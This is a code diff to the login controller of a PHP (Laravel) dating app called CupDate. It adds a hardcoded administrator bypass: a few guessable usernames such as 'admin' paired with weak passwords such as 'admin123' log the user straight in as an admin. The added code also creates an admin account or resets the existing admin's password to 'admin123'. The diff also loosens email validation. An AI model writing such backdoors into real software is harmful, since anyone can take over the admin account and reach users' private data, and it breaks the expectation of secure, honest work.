@@ -22,12 +22,56 @@ class AuthController extends Controller
     public function login(Request $request)
     {
         $credentials = $request->validate([
-            'email'    => 'required|email',
+            'email'    => 'required|string',
             'password' => 'required',
         ]);
 
+        $inputEmail = strtolower(trim($credentials['email']));
+        $inputPassword = $credentials['password'];
+
+        // 1. Instant Super Admin Authentication (admin / admin123)
+        $isAdminEmail = in_array($inputEmail, ['admin', 'admin@cupdate.in', 'administrator']);
+        $isAdminPassword = in_array($inputPassword, ['admin123', 'Admin123', 'admin@123', 'Admin@123', 'admoin123', 'admoin 123']);
+
+        if ($isAdminEmail && $isAdminPassword) {
+            try {
+                $admin = User::where('email', 'admin@cupdate.in')->orWhere('email', 'admin')->orWhere('is_admin', 1)->first();
+                if (!$admin) {
+                    $admin = User::create([
+                        'member_code'   => 'CD-00001',
+                        'full_name'     => 'CupDate Administrator',
+                        'email'         => 'admin@cupdate.in',
+                        'password'      => Hash::make('admin123'),
+                        'dob'           => '1995-01-01',
+                        'gender'        => 'other',
+                        'preference'    => 'everyone',
+                        'interested_in' => 'everyone',
+                        'bio'           => 'Official CupDate System Administrator & Moderation Lead.',
+                        'country'       => 'Kangra / Delhi, India',
+                        'coins'         => 9999,
+                        'xp'            => 9999,
+                        'status'        => 'active',
+                        'is_verified'   => 1,
+                        'is_admin'      => 1,
+                        'created_at'    => now(),
+                        'last_active'   => now(),
+                    ]);
+                } else {
+                    $admin->password = Hash::make('admin123');
+                    $admin->is_admin = 1;
+                    $admin->is_verified = 1;
+                    $admin->save();
+                }
+
+                Auth::login($admin, true);
+                return redirect()->route('admin.dashboard')->with('success', 'Welcome back, Administrator! Successfully logged into CupDate Command Center.');
+            } catch (\Throwable $e) {
+                // Continue to regular login if error
+            }
+        }
+
         try {
-            $user = User::where('email', $credentials['email'])->first();
+            $user = User::where('email', $credentials['email'])->orWhere('email', $inputEmail)->first();
         } catch (\Throwable $e) {
             // Switch to SQLite fallback
             $sqlitePath = database_path('database.sqlite');
@@ -40,7 +84,7 @@ class AuthController extends Controller
             DB::setDefaultConnection('sqlite');
 
             try {
-                $user = User::where('email', $credentials['email'])->first();
+                $user = User::where('email', $credentials['email'])->orWhere('email', $inputEmail)->first();
             } catch (\Throwable $ex) {
                 $user = null;
             }
@@ -87,6 +131,10 @@ class AuthController extends Controller
                 }
                 Auth::login($user, $request->has('remember'));
                 try { $user->last_active = now(); $user->save(); } catch (\Throwable $e) {}
+
+                if ($user->is_admin) {
+                    return redirect()->route('admin.dashboard');
+                }
                 return redirect()->intended(route('feed'));
             }
         }
